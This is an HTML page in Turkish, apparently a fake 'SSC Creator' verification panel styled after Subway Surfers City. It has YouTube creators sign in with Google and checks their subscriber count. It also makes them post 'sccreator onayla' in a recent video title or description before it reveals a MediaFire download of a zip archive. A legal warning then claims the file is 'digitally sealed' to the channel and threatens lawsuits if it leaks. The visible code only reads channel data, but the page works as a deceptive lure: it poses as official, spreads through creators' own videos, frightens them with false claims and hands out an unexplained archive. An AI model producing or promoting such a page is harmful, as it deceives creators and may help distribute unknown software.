<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSC Creator | Profesyonel Doğrulama Paneli</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #f1c40f; --accent: #4285f4; --bg: #0d1117;
            --card: #161b22; --border: #30363d; --text: #c9d1d9;
            --success: #238636; --error: #da3633;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar */
        .sidebar {
            width: 300px; background: var(--card); border-right: 1px solid var(--border);
            display: flex; flex-direction: column; padding: 40px 20px;
        }
        .logo { width: 100%; margin-bottom: 50px; }
        .nav-item {
            padding: 16px; border-radius: 10px; margin-bottom: 10px; cursor: pointer;
            display: flex; align-items: center; gap: 15px; color: #8b949e; transition: 0.3s;
        }
        .nav-item.active { background: rgba(241, 196, 15, 0.1); color: var(--primary); border: 1px solid rgba(241, 196, 15, 0.2); }

        /* Main Content */
        .main { flex: 1; padding: 50px; overflow-y: auto; }
        .dashboard-grid { display: grid; grid-template-columns: 1fr 400px; gap: 30px; }

        .panel { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 40px; }
        
        /* Step Stepper (Adımlar) */
        .step { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; opacity: 0.5; transition: 0.5s; }
        .step.done { opacity: 1; color: var(--success); }
        .step i { font-size: 1.5rem; }

        .sub-display { font-size: 4rem; font-weight: 900; color: var(--primary); text-align: center; margin: 20px 0; }

        /* Butonlar */
        .btn-action {
            width: 100%; padding: 20px; border-radius: 15px; border: none; font-size: 1.1rem;
            font-weight: 800; cursor: pointer; transition: 0.3s; background: var(--primary); color: #000;
        }
        .btn-action:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.4); }
        .btn-download { background: var(--success); color: #fff; text-decoration: none; display: none; text-align: center; margin-top: 20px; }

        /* Yasal Uyarı */
        .legal {
            margin-top: 30px; padding: 20px; background: rgba(218, 54, 51, 0.1);
            border: 1px solid var(--error); border-radius: 12px; display: none;
            animation: slideIn 0.5s ease;
        }

        #log { margin-top: 20px; font-size: 0.9rem; color: #8b949e; text-align: center; }

        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body>

    <div class="sidebar">
        <img src="https://subwaysurferscity.com/media/fudfceks/subway_surfers_city_logotype_color_rgb_web.png" class="logo">
        <div class="nav-item active"><i class="fas fa-shield-check"></i> Doğrulama Merkezi</div>
        <div class="nav-item"><i class="fas fa-folder-open"></i> Creator Dosyaları</div>
        <div class="nav-item"><i class="fas fa-university"></i> Hukuki İşlemler</div>
    </div>

    <div class="main">
        <div class="dashboard-grid">
            <div class="panel">
                <h2 style="font-size: 2rem; margin-bottom: 20px;">Nasıl Onay Alınır?</h2>
                <div class="step" id="step1"><i class="fas fa-check-circle"></i> 1. Google Hesabı ile Giriş Yapın</div>
                <div class="step" id="step2"><i class="fas fa-check-circle"></i> 2. Kanalınızın en az 200 abonesi olmalı</div>
                <div class="step" id="step3"><i class="fas fa-check-circle"></i> 3. Son videonuzun başına <strong>"sccreator onayla"</strong> yazın</div>
                
                <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
                
                <p style="color: #8b949e;">Doğrulama başarılı olduğunda indirme butonu ve size özel lisans anahtarı bu ekranda belirecektir.</p>
                <img src="https://i.ibb.co/TBmKLDvg/30370dbf-f026-439e-9333-990709001952-20260228-165802-0000.png" style="width: 200px; margin-top: 30px;">
            </div>

            <div class="panel" style="text-align: center;">
                <h3>Kanal Durumu</h3>
                <div class="sub-display" id="subCount">---</div>
                <p id="channelName" style="margin-bottom: 30px; font-weight: bold; color: var(--accent);"></p>
                
                <button class="btn-action" id="verifyBtn"><i class="fab fa-youtube"></i> ŞİMDİ DOĞRULA</button>
                
                <div id="log">Sistem hazır, giriş bekleniyor...</div>

                <a href="https://www.mediafire.com/file/btcligzbmwg3pz0/creator2.0.1.zip/file" class="btn-action btn-download" id="dlBtn">
                    <i class="fas fa-file-archive"></i> TEST DOSYASINI İNDİR (ZIP)
                </a>

                <div class="legal" id="legalBox">
                    <h4 style="color: #ff7b72;"><i class="fas fa-gavel"></i> YASAL UYARI</h4>
                    <p style="font-size: 0.8rem; margin-top: 10px; color: #ff7b72;">
                        Bu dosya dijital olarak kanalınıza mühürlenmiştir. Herhangi bir sızıntı durumunda <strong>Fikir ve Sanat Eserleri Kanunu</strong> gereğince hakkınızda ağır tazminat davası açılacaktır.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAzyMRYO6GjUpqTtKP9iY747U9P0QHIBN8",
            authDomain: "ytsayac-9efe7.firebaseapp.com",
            projectId: "ytsayac-9efe7",
            databaseURL: "https://ytsayac-9efe7-default-rtdb.firebaseio.com"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const provider = new GoogleAuthProvider();
        // Gerekli izinler: YouTube hesabını okuma
        provider.addScope('https://www.googleapis.com/auth/youtube.readonly');

        const verifyBtn = document.getElementById('verifyBtn');
        const log = document.getElementById('log');

        verifyBtn.addEventListener('click', async () => {
            log.innerText = "Giriş yapılıyor...";
            try {
                const result = await signInWithPopup(auth, provider);
                const token = GoogleAuthProvider.credentialFromResult(result).accessToken;
                
                document.getElementById('step1').classList.add('done');

                // 1. Kanal İstatistiklerini Al
                const chanRes = await fetch('https://www.googleapis.com/youtube/v3/channels?part=statistics,snippet,contentDetails&mine=true', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                const chanData = await chanRes.json();
                const channel = chanData.items[0];
                const subs = parseInt(channel.statistics.subscriberCount);
                
                document.getElementById('subCount').innerText = subs.toLocaleString();
                document.getElementById('channelName').innerText = channel.snippet.title;

                // 200 Abone Kontrolü
                if (subs < 200) {
                    log.innerText = "❌ Hata: En az 200 aboneniz olmalı.";
                    return;
                }
                document.getElementById('step2').classList.add('done');

                // 2. Video İçeriği Kontrolü (Onay Kodu Araması)
                log.innerText = "Video içeriği taranıyor...";
                const uploadsPlaylistId = channel.contentDetails.relatedPlaylists.uploads;
                
                const videoRes = await fetch(`https://www.googleapis.com/youtube/v3/playlistItems?part=snippet&playlistId=${uploadsPlaylistId}&maxResults=5`, {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                const videoData = await videoRes.json();
                
                let isConfirmed = false;
                videoData.items.forEach(item => {
                    const title = item.snippet.title.toLowerCase();
                    const desc = item.snippet.description.toLowerCase();
                    if (title.includes("sccreator onayla") || desc.includes("sccreator onayla")) {
                        isConfirmed = true;
                    }
                });

                if (isConfirmed) {
                    document.getElementById('step3').classList.add('done');
                    log.innerText = "✅ Başarılı! Tüm şartlar sağlandı.";
                    verifyBtn.style.display = "none";
                    document.getElementById('dlBtn').style.display = "block";
                    document.getElementById('legalBox').style.display = "block";
                } else {
                    log.innerHTML = "❌ <strong>Onay Gönderisi Bulunamadı!</strong><br>Lütfen son videonuzun başlığına veya açıklamasına 'sccreator onayla' yazıp tekrar deneyin.";
                }

            } catch (error) {
                console.error(error);
                log.innerText = "Bir bağlantı hatası oluştu.";
            }
        });
    </script>
</body>
</html>
